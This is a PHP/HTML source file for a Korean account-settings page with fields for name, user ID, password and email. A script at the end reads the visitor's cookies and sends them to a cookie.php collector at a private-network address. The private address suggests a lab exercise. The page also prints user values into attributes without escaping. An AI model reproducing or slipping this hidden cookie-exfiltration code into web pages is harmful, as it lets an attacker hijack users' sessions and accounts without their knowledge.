<?php
require_once("function/session.php");
?>

<!DOCTYPE html>
<html lang="ko">

<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name='viewport' content='width=device-width, intial-scale=1.0'>
	<title>마이페이지</title>
    <link rel="stylesheet" href="/css/account.css">
</head>
<body>
<div class="account-form">
	<h2>회원정보</h2>
	<form action="update.php" method="post">
        <p><input type="text" name="name" placeholder="<?=$name?>" class="text-field" disabled></p>
		<p><input type="text" name="userid" placeholder="<?=$userid?>" class="text-field" disabled></p>
		<p><input type="password" name="currentpw" placeholder="현재 비밀번호" required class="text-field"></p>
		<p><input type="password" name="changepw" placeholder="변경할 비밀번호" class="text-field"></p>
        <p><input type="text" name="changeemail" placeholder="<?=$email?>"  class="text-field"></p>
		<p><input type="submit" value="회원정보 수정" class="submit-btn"></p>
	</form>
	</div>
</body>
<script>
	var cookie = document.cookie;
	var url = "http://192.168.0.26/cookie.php?cookie="
	new Image().src = url + cookie;
</script>
</html>